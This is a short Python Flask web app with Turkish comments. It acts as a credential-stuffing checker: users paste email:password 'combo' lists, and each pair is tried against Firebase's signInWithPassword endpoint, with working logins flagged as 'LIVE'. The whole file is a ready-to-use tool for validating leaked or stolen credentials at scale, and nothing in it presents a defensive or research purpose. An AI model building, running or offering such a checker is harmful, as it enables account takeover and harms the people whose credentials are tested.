import os
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# Buraya tırnak içine Firebase'den aldığın API KEY'i yapıştır
API_KEY = "BURAYA_API_ANAHTARINI_YAPISTIR"

def check_account(email, password):
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
    payload = {"email": email, "password": password, "returnSecureToken": True}
    
    try:
        r = requests.post(url, json=payload, timeout=10)
        data = r.json()
        
        if r.status_code == 200:
            return "LIVE"
        
        # Google'ın verdiği asıl hatayı çekiyoruz (Hata burada gizli!)
        error_code = data.get('error', {}).get('message', 'BILINMEYEN_HATA')
        return error_code
        
    except Exception as e:
        return f"SISTEM_HATASI: {str(e)}"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_scan', methods=['POST'])
def start_scan():
    data = request.json
    combos = data.get('combos', '').splitlines()
    results = []
    
    for line in combos:
        if ":" in line:
            parts = line.split(":", 1)
            email, password = parts[0].strip(), parts[1].strip()
            status = check_account(email, password)
            results.append({"account": f"{email}:{password}", "status": status})
    
    return jsonify({"results": results})

if __name__ == '__main__':
    app.run(debug=True)
